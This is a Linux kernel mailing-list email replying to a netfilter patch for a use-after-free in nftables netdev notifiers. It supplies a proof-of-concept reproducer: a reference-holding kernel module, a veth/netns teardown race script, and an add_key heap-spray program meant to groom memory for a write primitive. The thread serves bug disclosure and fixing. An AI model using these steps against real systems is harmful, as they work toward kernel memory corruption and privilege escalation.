Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=74.125.230.71
ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
	t=1793884538;
	b=GTPBOxGoPHmevUCS7eb1lRrVudxNeFLCkLD2SnA6P9iwtebNxshqLzSpFmpzXW1pOLS9
	 kA3DaNsdRX8sWqAOvRi/HdlLGCeVyV38Z9LgN1BiYvmHWeE5G9yiTo3bvZ+zAOoAgt5wG
	 1+L6gUpqZStTQFzVe/f57xht2hium5uVP6gMKrgPGS0zKa2FofY9TodZwHinJLvailYeT
	 iIqCY21ANs2//TlRBjFz9t5WyZ6RGFGr1p5AZYvjCxMLmZ7JjHn+R4C3vl4ho/HCqcQJm
	 bDB8rr1Ynbcbt+ukOphBQZbmiXHB2Sr44hJagJ1vQ6UkE5XOM96K/0aE0fXSXtLlsKQ==
ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793884538;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
	bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
	b=1aE8qeF/XBmne6XBDH52VciIsfB/USUebB6N89qTNsLwUeQl86VSkAf4rnwmU3MksBTR
	 wuaq4WeCziXpdq4yHC3eNb27Jwjdihuy4Dk/FsHE36gz6FnEqARdcM2rJY2xIZ5C/gNj5
	 fWyOAU3d+0ym8zgNcMQ3Ozrw2UH9S4AewOukY7kxJveWYIZ6Lq3iJ0k6ASJ/4OxoMiX6c
	 rEZujnRa5+UkF26XMlokSkSc2EldIiSptrC5zBdBcqyM8rQ9ZSbRZOCqmaFnDboi75s+u
	 K7wVyU4LbcQ7jCEAv01CBNDE6HE3ix4AjxBZvrJ+ylqtQGyGgmgt+sNWUZoGTBr+leg==
ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=SKq0qtKH;
	arc=pass header.oldest-pass=0 smtp.remote-ip=74.125.230.71
Received: from mail-lr2-f7.google.com (mail-lr2-f7.google.com [74.125.230.71])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DD85D606A32D
	for <netdev@vger.kernel.org>; Thu,  5 Nov 2026 13:15:37 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org DD85D606A32D
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=SKq0qtKH
Received: by mail-lr2-f7.google.com with SMTP id 38308e7fff4ca-3acaedeb908so13389061fa.1
        for <netdev@vger.kernel.org>; Thu, 05 Nov 2026 05:15:37 -0800 (PST)
ARC-Seal: i=1; a=rsa-sha256; t=1793884536; cv=none;
        d=google.com; s=arc-20260327;
        b=PtPFc7A/CcLoVIFLTJFWQ3Rh4Ys97HBjq/6z8wUPE1gGGkuJwPhhtK+But82FFWDot
         LmRnLQI+OZ9N2tPM6wkJ/5ABY+7uN9IwSvwXRofCmEhFs6GaIeGossHw9JQ/mTw+8XIz
         nJImZXDEgrlsGH8Zk4jISSQFbdTY4MZl46E2UHJOMANN2aUaoyT1V71i4JIXq1vSEp/Q
         YvqgqdTju9jOZYFsavAaKyAM9TB2+QER8vFKGZHSiXEfyxR19EHnEf+VqWhMrb6EPaxd
         FjgccWcZDTxhbPt2pDf/Ok7tQsnUsjxDvwQSaSz7R0vx5fnmNKMhzvKyF6q5mpSFXcXG
         vwMQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
        fh=DsyTcdJQiUSIkfEw1O2qTJRxeg4zX6WVlTvnfCVOyiA=;
        b=hRxA2S4Bw1R8TX6HbxWqmtBEltmDisSBiwoGsh4Dygy4B5jR2lAFLtj9KxLBXXMghB
         UpEew6JU6S4r1T2rk98N65GIMgzsyUSIVSBF9y6Ehcu33y64tyBONo4WI4adlFwU4KsP
         f1hEIGq3kkaZM3s8VKlBk8ZnbQaJXSe2qEZk/FJVDqusY199F6GudefiP/oz5V+pqqrn
         G/NuCKa/gLkKsTGSaO+P6j4PwGLUbARxhnKePndDZgm6b+VVHhloDI3AR0SE2vGKtAIN
         ViQ6MBpgQSyVYzOE+8UGuFntpYkpjS/fEIJJ+Rp6RxYkxycB/uQ65Ei8Ie8AHfI1RRzr
         0NWQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1793884536; x=1794489336; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
        b=SKq0qtKHaz5hlZzzTc7tYusebAdye49P8RO5vtq6FFmszGBtaIGPg/SBRjQhf7oyVy
         QXskfHMzh4p2aujMCA189WGErSLX8ZNpF1pE7n2CjUMVD32eEYm6g0fNrNBdKKeAraCN
         YGFzWkOv3ILiaImplylRCGTF9nY+BW4pKFB0tIM22RFrCL3hXNSv/a5vouo1DQtXi0lw
         BaRGmPUt00FyTjjLhQsjN2jDU5PL9FV/ZrwfWAY6QO+Y7xX/VpPQ3j1l43CvzjyT7WoE
         pW1MD4UW1iyvGEmw2nCFgveDySRtH5yaJ3Pg/lHfBhv+BHs6pRwNpBKog9OjCiuBgo5y
         TjMg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1793884536; x=1794489336;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=20StToLPzq8RdKTRyv1hu2OML2282eJNSIbdjAvoE1Q=;
        b=SXlDiSDMl5cctCCvaRDxqcxYVHTzX3UZAD6p0hEV+rxQMjf403byNO8rDSjCPqOVUp
         VFEXORwtU+Zh8u97UYm0k4UHCaO4qgxKPv43TDSDYbEV3fPiX0to8D7LpiXDCNUtG4F6
         uDY5NSzdnh09ONT12gLnHntVnc8CS662t57vg/OdyRRcbIn8pWzFxHXdWstN09qs0Ytu
         9lu7ZkrV1u+mJRtgJHHIITRL/JKqIbkBCt7q6GVb4bfiBFCYcVxUAZQYU32uCjc4dD64
         fxt+lUtBNjE69M4QYwvgWgxgz4DCFK5JvQDUaHohhx/S/pTFWXL/8U99UmgUfdvF6p46
         1SyA==
X-Forwarded-Encrypted: i=1; AKwUvBzBA7JewW44cOeJx0ebDKXrEpaRsWb43Ciob+wsHDN05vuP2HLOAuZmcFU8y/DSlu8KL8NwdXg=@vger.kernel.org
X-Gm-Message-State: APuU4Z8xKt9rD+T74rUhMYiMt1uBrtMaJbDEfHuoZTpK7fL3RZjnNz94
	XQxin7BmGjp9XIX9ys6KZ0KMJBDTQnVzaxMevSXRixe9rx/EIfKOUZHVxYA/BrLOWtfVIjF/BtY
	5vpg6GCL0C7aZEkXAanaU3UdryScANaQ=
X-Gm-Gg: AYBFou3RJoVvIqRxTjqZUhXVZiKs/nALrOViY5E2oS4z0PkvibX1PcDfFZDymkOLi4t
	VTwT1o+GhOArw0cfmSvsOT41F0p29D/hkRa7bpsMJGFuSFqLi/LL+li+EOQL2r2z8sA/SthXgNR
	f32SfdQS9vUTL9XlhiWRW+bRFN6QyUsZjEuU1m0wsGq0xt7iS2VQGguabpraZF0cBZUzfBETRfw
	DvHL8IvBFR2IGC8RXMO5C9jbU5qdNM9U/BZw7l4x52sywFR+53G8io/2fiaJOhPtxrSdfVdpByS
	GfFgX2F7rR9PLxuPdv5i/oQTP6bm2QGcYlu8CwtZdk99Dh9YqG8o0uYV1xXbrs7mEEzSOmvNwvc
	sZmSWL+qvEF1LT4d80jHkcJTRJZFzlqbodCJW
X-Received: by 2002:a05:6512:2345:b0:5bf:c17e:a62d with SMTP id
 2adb3069b0e04-5bfd9576996mr6637900e87.57.1793884535718; Thu, 05 Nov 2026
 05:15:35 -0800 (PST)
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
References: <20261105114817.3033625-1-bsdhenrymartin@gmail.com> <aux2zX3dLKYnzG56@chamomile>
In-Reply-To: <aux2zX3dLKYnzG56@chamomile>
From: henry martin <bsdhenrymartin@gmail.com>
Date: Thu, 5 Nov 2026 21:15:24 +0800
X-Gm-Features: AclHuK-jZr7CdFgzP-G6uFCKjos8f9kbJbc8PNhLiWtDX1q3Lnk7XQ_JLtzv6XM
Message-ID: <CAEnQdOox6ddd_GScf24z65bocnMvX0KHeDTju_8j3bzQjLi0HQ@mail.gmail.com>
Subject: Re: [PATCH] netfilter: nf_tables: fix pernet use-after-free on
 UNREGISTER rebroadcast
To: Pablo Neira Ayuso <pablo@netfilter.org>
Cc: fw@strlen.de, davem@davemloft.net, edumazet@kernel.org, kuba@kernel.org, 
	pabeni@redhat.com, netfilter-devel@vger.kernel.org, coreteam@netfilter.org, 
	netdev@vger.kernel.org, stable@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Pablo,

Full reproducer below; runs as root in a KASAN guest. Verified on
v7.4-rc1 (6628e7d4c6b2c): unpatched, the quoted splat (freed by
net_passive_dec <- cleanup_net); patched, zero reports and all three
notifiers hit the new guard 91/91/91 times over the rebroadcast window.

delayer.ko only simulates a driver holding a reference with a delay
across NETDEV_UNREGISTER - the same delay source as the netdevsim
case in the original netdev-genl syzbot report; it is an environment
aid, not part of the bug.

1) delayer.c - helper module (build: make -C <kernel tree> M=3D$PWD modules=
):

// delayer.c - holds a device reference with a delay across NETDEV_UNREGIST=
ER
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netdevice.h>
#include <linux/workqueue.h>

static char *watch_dev =3D "vethA";
module_param(watch_dev, charp, 0444);
static int delay_secs =3D 15;
module_param(delay_secs, int, 0444);

static void delayer_put(struct work_struct *w);
static struct delayed_work dw;
static struct net_device *held;

static void delayer_put(struct work_struct *w)
{
if (held) {
pr_info("delayer: dev_put %s\n", held->name);
dev_put(held);
held =3D NULL;
}
}

static int delayer_event(struct notifier_block *nb, unsigned long ev, void =
*ptr)
{
struct net_device *dev =3D netdev_notifier_info_to_dev(ptr);

if (ev =3D=3D NETDEV_UNREGISTER && !strcmp(dev->name, watch_dev) && !held) =
{
dev_hold(dev);
held =3D dev;
schedule_delayed_work(&dw, delay_secs * HZ);
pr_info("delayer: holding %s for %ds\n", dev->name, delay_secs);
}
return NOTIFY_DONE;
}

static struct notifier_block delayer_nb =3D { .notifier_call =3D delayer_ev=
ent };

static int __init delayer_init(void)
{
INIT_DELAYED_WORK(&dw, delayer_put);
return register_netdevice_notifier(&delayer_nb);
}

static void __exit delayer_exit(void)
{
cancel_delayed_work_sync(&dw);
unregister_netdevice_notifier(&delayer_nb);
if (held)
dev_put(held);
}

module_init(delayer_init);
module_exit(delayer_exit);
MODULE_LICENSE("GPL");

2) repro.sh - the trigger (prerequisite: insmod delayer.ko
watch_dev=3DvethA delay_secs=3D60):

#!/bin/bash
set -e
ip link add vethA type veth peer name vethB
ip link set vethB up
ip netns add A
ip link set vethA netns A
ip -n A link set lo up
ip -n A link set vethA up
dmesg -C
ip link del vethB &
sleep 0.5
ip netns del A
sleep 20
dmesg | grep -cE 'KASAN|BUG: '

3) sprayer.c - heap groom for the write leg only, not needed for the
   splat (sprays user_key_payload, kmalloc-256 non-cg):

// sprayer.c - spray kmalloc-256 non-cg objects via add_key
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#define __NR_add_key 248
#define PLEN 216
int main(int argc, char **argv) {
    unsigned char buf[PLEN];
    memset(buf, argc > 1 ? argv[1][0] : 'A', PLEN);
    int n =3D argc > 2 ? atoi(argv[2]) : 3000;
    int ids =3D 0;
    for (int i =3D 0; i < n; i++) {
        char desc[32];
        snprintf(desc, sizeof(desc), "spray_%d", i);
        long r =3D syscall(__NR_add_key, "user", desc, buf, PLEN, -2);
        if (r >=3D 0) ids++;
    }
    printf("sprayed %d keys\n", ids);
    pause();
    return 0;
}

Run: insmod delayer.ko watch_dev=3DvethA delay_secs=3D60; ( ./sprayer A
4000 & ); bash repro.sh

Thanks,
Henry

Pablo Neira Ayuso <pablo@netfilter.org> =E4=BA=8E2026=E5=B9=B411=E6=9C=885=
=E6=97=A5=E5=91=A8=E5=9B=9B 20:30=E5=86=99=E9=81=93=EF=BC=9A
>
> On Thu, Nov 05, 2026 at 07:48:17PM +0800, Henry Martin wrote:
> > A device unregistered outside its netns teardown can be stuck in
> > netdev_wait_allrefs_any() while the pernet exit handlers of its
> > netns run to completion.  The nftables pernet storage is freed on
> > that path.  The rebroadcasts then hit the nf_tables netdev
> > notifiers (base chain, flowtable, offload), which read the freed
> > storage via nft_pernet() and take commit_mutex on it, e.g. on
> > mainline v7.4-rc1 (KASAN build):
> >
> >     BUG: KASAN: slab-use-after-free in nf_tables_netdev_event+0x17c
> >     Read of size 8 at addr ffff88811061c980 by task ip/422
> >     Call Trace:
> >      nf_tables_netdev_event+0x17c/0x1c0
> >     Freed by task 62:
> >      kfree+0x161/0x450
> >      net_passive_dec+0xe5/0x180
> >      cleanup_net+0x45a/0x780
>
> Could ypu pass on a reproducer?
>
> > Skip the rebroadcasts in all three notifiers, which are the only
> > NETDEV_UNREGISTER events delivered with reg_state =3D=3D
> > NETREG_UNREGISTERED.  This mirrors commit fd0909e963ed8
> > ("netdev-genl: ignore NETDEV_UNREGISTER rebroadcasts").
> >
> > This issue was discovered by Tencent CodeBuddy Security.
> >
> > Fixes: 8a4fc54b07d75 ("net: get rid of rtnl_lock_unregistering()")
> > Cc: stable@vger.kernel.org
> > Signed-off-by: Henry Martin <bsdhenrymartin@gmail.com>
> > ---
> >  net/netfilter/nf_tables_api.c     | 9 +++++++++
> >  net/netfilter/nf_tables_offload.c | 8 ++++++++
> >  net/netfilter/nft_chain_filter.c  | 9 +++++++++
> >  3 files changed, 26 insertions(+)
> >
> > diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_ap=
i.c
> > index 59ac623e6805f..e43a1b9fefc36 100644
> > --- a/net/netfilter/nf_tables_api.c
> > +++ b/net/netfilter/nf_tables_api.c
> > @@ -9902,6 +9902,15 @@ static int nf_tables_flowtable_event(struct noti=
fier_block *this,
> >           event !=3D NETDEV_CHANGENAME)
> >               return NOTIFY_DONE;
> >
> > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
> > +      * while waiting for the last references to be dropped; the
> > +      * netns and its nftables pernet storage may already be torn
> > +      * down by then.
> > +      */
> > +     if (event =3D=3D NETDEV_UNREGISTER &&
> > +         READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
> > +             return NOTIFY_DONE;
> > +
> >       net =3D dev_net(dev);
> >       nft_net =3D nft_pernet(net);
> >       mutex_lock(&nft_net->commit_mutex);
> > diff --git a/net/netfilter/nf_tables_offload.c b/net/netfilter/nf_table=
s_offload.c
> > index 0ac3c26dfb3d1..d360e233d0366 100644
> > --- a/net/netfilter/nf_tables_offload.c
> > +++ b/net/netfilter/nf_tables_offload.c
> > @@ -672,6 +672,14 @@ static int nft_offload_netdev_event(struct notifie=
r_block *this,
> >       if (event !=3D NETDEV_UNREGISTER)
> >               return NOTIFY_DONE;
> >
> > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
> > +      * while waiting for the last references to be dropped; the
> > +      * netns and its nftables pernet storage may already be torn
> > +      * down by then.
> > +      */
> > +     if (READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
> > +             return NOTIFY_DONE;
> > +
> >       nft_net =3D nft_pernet(net);
> >       mutex_lock(&nft_net->commit_mutex);
> >       chain =3D __nft_offload_get_chain(nft_net, dev);
> > diff --git a/net/netfilter/nft_chain_filter.c b/net/netfilter/nft_chain=
_filter.c
> > index e04e689f22284..b3cfe8d426753 100644
> > --- a/net/netfilter/nft_chain_filter.c
> > +++ b/net/netfilter/nft_chain_filter.c
> > @@ -412,6 +412,15 @@ static int nf_tables_netdev_event(struct notifier_=
block *this,
> >           event !=3D NETDEV_CHANGENAME)
> >               return NOTIFY_DONE;
> >
> > +     /* netdev_wait_allrefs_any() rebroadcasts NETDEV_UNREGISTER
> > +      * while waiting for the last references to be dropped; the
> > +      * netns and its nftables pernet storage may already be torn
> > +      * down by then.
> > +      */
> > +     if (event =3D=3D NETDEV_UNREGISTER &&
> > +         READ_ONCE(dev->reg_state) =3D=3D NETREG_UNREGISTERED)
> > +             return NOTIFY_DONE;
> > +
> >       nft_net =3D nft_pernet(dev_net(dev));
> >       mutex_lock(&nft_net->commit_mutex);
> >
> > --
> > 2.43.7
> >
